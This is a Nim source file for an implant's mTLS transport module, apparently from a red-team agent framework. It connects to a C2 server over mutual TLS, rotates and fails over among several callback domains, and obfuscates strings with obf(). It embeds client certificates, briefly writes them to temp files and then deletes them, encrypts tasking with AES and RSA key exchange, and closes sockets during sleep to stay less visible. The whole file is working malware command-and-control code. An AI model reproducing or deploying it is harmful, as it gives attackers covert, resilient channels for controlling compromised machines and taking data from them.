import std/[base64, strutils, json, os, net, random]
import ../config
import ../utils/crypto
import ../utils/debug
import ../utils/strenc

const encryptedExchange {.used.} = static: getEnv(obf("ENCRYPTED_EXCHANGE_CHECK"), "false").toLowerAscii in ["true", "t"]
when encryptedExchange:
  import ../utils/key_exchange

# Compile-time embedded certificate data (PEM-encoded, base64-wrapped for safe embedding)
const mtlsClientCert {.used.} = static: getEnv(obf("MTLS_CLIENT_CERT"), "")
const mtlsClientKey {.used.} = static: getEnv(obf("MTLS_CLIENT_KEY"), "")
const mtlsCaCert {.used.} = static: getEnv(obf("MTLS_CA_CERT"), "")

type
  MtlsProfile* = ref object
    config: Config
    aesKey: seq[byte]
    aesDecKey: seq[byte]
    socket: Socket
    sslContext: SslContext
    connected: bool
    callbackDomains: seq[tuple[host: string, port: int]]
    domainRotation: string
    failoverThreshold: int
    currentDomainIndex: int
    failCount: int
    # Temp file paths for certs (cleaned up after context creation)
    certFiles: seq[string]

proc parseDomains(domainsStr: string): seq[tuple[host: string, port: int]] =
  ## Parse callback_domains JSON array of "host:port" strings
  result = @[]
  try:
    let domainsJson = parseJson(domainsStr)
    for domain in domainsJson:
      let d = domain.getStr()
      let parts = d.rsplit(':', maxsplit = 1)
      if parts.len == 2:
        result.add((host: parts[0], port: parseInt(parts[1])))
      else:
        # Default to port 8443 if no port specified
        result.add((host: d, port: 8443))
  except:
    debugLog "mtls", "mTLS: Failed to parse callback_domains"

proc writeTempCert(data: string, prefix: string): string =
  ## Write PEM data to a temp file and return the path
  let path = getTempDir() / prefix & "_" & $rand(999999)
  writeFile(path, data)
  return path

proc cleanupCertFiles(profile: MtlsProfile) =
  ## Remove temporary certificate files
  for f in profile.certFiles:
    try:
      removeFile(f)
    except:
      discard

proc createSslContext(profile: MtlsProfile): SslContext =
  ## Create SSL context with mTLS client certificate authentication
  var certPath, keyPath, caPath: string

  # Decode and write cert data to temp files
  if mtlsClientCert.len > 0:
    let certPem = decode(mtlsClientCert)
    certPath = writeTempCert(certPem, "mtls_cert")
    profile.certFiles.add(certPath)
  
  if mtlsClientKey.len > 0:
    let keyPem = decode(mtlsClientKey)
    keyPath = writeTempCert(keyPem, "mtls_key")
    profile.certFiles.add(keyPath)
  
  if mtlsCaCert.len > 0:
    let caPem = decode(mtlsCaCert)
    caPath = writeTempCert(caPem, "mtls_ca")
    profile.certFiles.add(caPath)

  debugLog "mtls", "mTLS: Creating SSL context with client cert auth"

  result = newContext(
    protVersion = protTLSv1,
    verifyMode = CVerifyPeer,
    certFile = certPath,
    keyFile = keyPath,
    caFile = caPath
  )

proc newMtlsProfile*(): MtlsProfile =
  ## Create a new mTLS profile
  result = MtlsProfile()
  result.config = getConfig()
  result.connected = false
  result.currentDomainIndex = 0
  result.failCount = 0
  result.certFiles = @[]

  # Parse callback_domains
  let domainsStr = result.config.callbackDomains
  if domainsStr.len == 0:
    raise newException(ValueError, obf("CALLBACK_DOMAINS not set for mTLS profile"))
  result.callbackDomains = parseDomains(domainsStr)
  if result.callbackDomains.len == 0:
    raise newException(ValueError, obf("No valid callback domains parsed"))

  # Domain rotation strategy
  result.domainRotation = result.config.domainRotation
  if result.domainRotation.len == 0:
    result.domainRotation = "fail-over"

  # Failover threshold
  result.failoverThreshold = result.config.failoverThreshold
  if result.failoverThreshold == 0:
    result.failoverThreshold = 5

  # Create SSL context with client certs
  result.sslContext = createSslContext(result)

  # Cleanup temp cert files after context is loaded into memory
  result.cleanupCertFiles()

  debugLog "mtls", "mTLS Profile initialized"
  debugLog "mtls", "Callback domains: ", $result.callbackDomains.len, " entries"
  debugLog "mtls", "Domain rotation: ", result.domainRotation

proc selectDomain(profile: var MtlsProfile): tuple[host: string, port: int] =
  ## Select domain based on rotation strategy
  case profile.domainRotation
  of obf("random"):
    result = profile.callbackDomains[rand(profile.callbackDomains.len - 1)]
  of obf("round-robin"):
    result = profile.callbackDomains[profile.currentDomainIndex]
    profile.currentDomainIndex = (profile.currentDomainIndex + 1) mod profile.callbackDomains.len
  else: # fail-over
    result = profile.callbackDomains[profile.currentDomainIndex]

proc connectToServer(profile: var MtlsProfile): bool =
  ## Establish TLS connection to the C2 server
  if profile.connected:
    return true

  let domain = profile.selectDomain()
  debugLog "mtls", "mTLS: Connecting to ", domain.host, ":", $domain.port

  try:
    profile.socket = newSocket()
    wrapSocket(profile.sslContext, profile.socket)
    profile.socket.connect(domain.host, Port(domain.port))
    profile.connected = true
    profile.failCount = 0
    debugLog "mtls", "mTLS: Connected successfully"
    return true
  except:
    debugLog "mtls", "mTLS: Connection failed: ", getCurrentExceptionMsg()
    profile.connected = false
    profile.failCount += 1

    # Handle failover
    if profile.domainRotation == obf("fail-over") and
       profile.failCount >= profile.failoverThreshold:
      profile.currentDomainIndex = (profile.currentDomainIndex + 1) mod profile.callbackDomains.len
      profile.failCount = 0
      debugLog "mtls", "mTLS: Failover threshold reached, switching to domain index ", $profile.currentDomainIndex

    return false

proc sendLengthPrefixed(socket: Socket, message: string) =
  ## Send a length-prefixed message: [4-byte big-endian length][payload]
  let messageLen = message.len.uint32
  var lenBytes: array[4, byte]
  lenBytes[0] = byte((messageLen shr 24) and 0xFF)
  lenBytes[1] = byte((messageLen shr 16) and 0xFF)
  lenBytes[2] = byte((messageLen shr 8) and 0xFF)
  lenBytes[3] = byte(messageLen and 0xFF)

  debugLog "mtls", "mTLS: Sending ", $messageLen, " bytes"

  # Send length prefix
  var sent = 0
  while sent < 4:
    sent += socket.send(addr lenBytes[sent], 4 - sent)

  # Send payload
  socket.send(message)

proc recvLengthPrefixed(socket: Socket): string =
  ## Receive a length-prefixed message: [4-byte big-endian length][payload]
  var lenBytes: array[4, byte]

  # Read 4-byte length prefix
  var read = 0
  while read < 4:
    let n = socket.recv(addr lenBytes[read], 4 - read)
    if n <= 0:
      debugLog "mtls", "mTLS: Connection closed while reading length"
      return ""
    read += n

  # Convert from big-endian
  let messageLen = (lenBytes[0].uint32 shl 24) or
                   (lenBytes[1].uint32 shl 16) or
                   (lenBytes[2].uint32 shl 8) or
                   lenBytes[3].uint32

  debugLog "mtls", "mTLS: Expecting ", $messageLen, " bytes"

  if messageLen == 0 or messageLen > 100_000_000: # 100MB sanity check
    debugLog "mtls", "mTLS: Invalid message length: ", $messageLen
    return ""

  # Read payload
  result = socket.recv(messageLen.int)
  debugLog "mtls", "mTLS: Received ", $result.len, " bytes"

proc send*(profile: var MtlsProfile, data: string, callbackUuid: string = ""): string =
  ## Send data to C2 server via mTLS raw socket
  let uuid = if callbackUuid.len > 0: callbackUuid else: profile.config.uuid

  debugLog "mtls", "=== SENDING DATA VIA mTLS ==="
  try:
    let jsonData = parseJson(data)
    if data.len < 2048:
      debugLog "mtls", "Request JSON:"
      debug jsonData.pretty()
    else:
      debugLog "mtls", "Request: Large payload (", data.len, " bytes)"
      if jsonData.hasKey(obf("action")):
        debugLog "mtls", "Action: ", jsonData["action"].getStr()
  except:
    debugLog "mtls", "Request data (first 500 chars): ", data[0..<min(500, data.len)]

  # Encrypt or encode payload
  var payload: string
  if profile.aesKey.len > 0 and callbackUuid.len > 0:
    debugLog "mtls", "Encrypting payload with AES-256-CBC+HMAC"
    payload = encryptPayload(data, profile.aesKey, uuid)
  else:
    debugLog "mtls", "Sending unencrypted payload (Base64 only)"
    payload = encode(uuid & data)

  # Ensure connection (reconnect if needed)
  if not profile.connected:
    if not profile.connectToServer():
      debugLog "mtls", "mTLS: Cannot send - not connected"
      return ""

  try:
    # Send length-prefixed message
    sendLengthPrefixed(profile.socket, payload)

    # Receive length-prefixed response
    let rawResponse = recvLengthPrefixed(profile.socket)

    if rawResponse.len == 0:
      debugLog "mtls", "mTLS: Empty response, marking disconnected"
      profile.connected = false
      return ""

    # Decrypt or decode response
    if profile.aesKey.len > 0 and callbackUuid.len > 0:
      debugLog "mtls", "Decrypting response with AES-256-CBC+HMAC"
      result = decryptPayload(rawResponse, profile.aesKey)
    else:
      debugLog "mtls", "Decoding Base64 response"
      let decoded = decode(rawResponse)
      if decoded.len > 36:
        result = decoded[36..^1]
      else:
        result = ""

    # Log response
    if result.len > 0:
      debugLog "mtls", "=== RECEIVED mTLS RESPONSE ==="
      try:
        let jsonResp = parseJson(result)
        if result.len < 2048:
          debugLog "mtls", "Response JSON:"
          debug jsonResp.pretty()
        else:
          debugLog "mtls", "Response: Large payload (", result.len, " bytes)"
          if jsonResp.hasKey(obf("action")):
            debugLog "mtls", "Action: ", jsonResp["action"].getStr()
      except:
        debugLog "mtls", "Response data (first 500 chars): ", result[0..<min(500, result.len)]

  except:
    debugLog "mtls", "mTLS send failed: ", getCurrentExceptionMsg()
    profile.connected = false
    result = ""

proc setAesKey*(profile: var MtlsProfile, key: seq[byte]) =
  profile.aesKey = key

proc setAesDecKey*(profile: var MtlsProfile, key: seq[byte]) =
  profile.aesDecKey = key

proc hasAesKey*(profile: MtlsProfile): bool =
  result = profile.aesKey.len > 0

proc cleanup*(profile: var MtlsProfile) =
  ## Close TLS connection to avoid keeping ESTABLISHED connections during sleep
  debugLog "mtls", "mTLS: Cleaning up connection"
  if profile.connected:
    try:
      profile.socket.close()
    except:
      discard
    profile.connected = false

proc reconnect*(profile: var MtlsProfile) =
  ## Re-establish TLS connection after cleanup
  debugLog "mtls", "mTLS: Reconnecting..."
  discard profile.connectToServer()

proc performKeyExchange*(profile: var MtlsProfile): tuple[success: bool, newUuid: string] =
  ## Perform RSA key exchange to establish AES session key
  if not profile.config.encryptedExchange:
    debugLog "mtls", "No key exchange required (ENCRYPTED_EXCHANGE_CHECK=F)"
    return (true, "")

  when not encryptedExchange:
    debugLog "mtls", "RSA not compiled in (ENCRYPTED_EXCHANGE_CHECK not set at build time)"
    return (true, "")
  else:
    var p = profile
    proc sendWrapper(data: string, uuid: string): string =
      return p.send(data, uuid)

    let exchangeResult = performRsaKeyExchange(profile.config, profile.config.uuid, sendWrapper)

    if exchangeResult.success and exchangeResult.sessionKey.len > 0:
      profile.setAesKey(exchangeResult.sessionKey)
      return (true, exchangeResult.newUuid)
    elif exchangeResult.success:
      return (true, "")
    else:
      debugLog "mtls", "Key exchange failed: ", exchangeResult.error
      return (false, "")
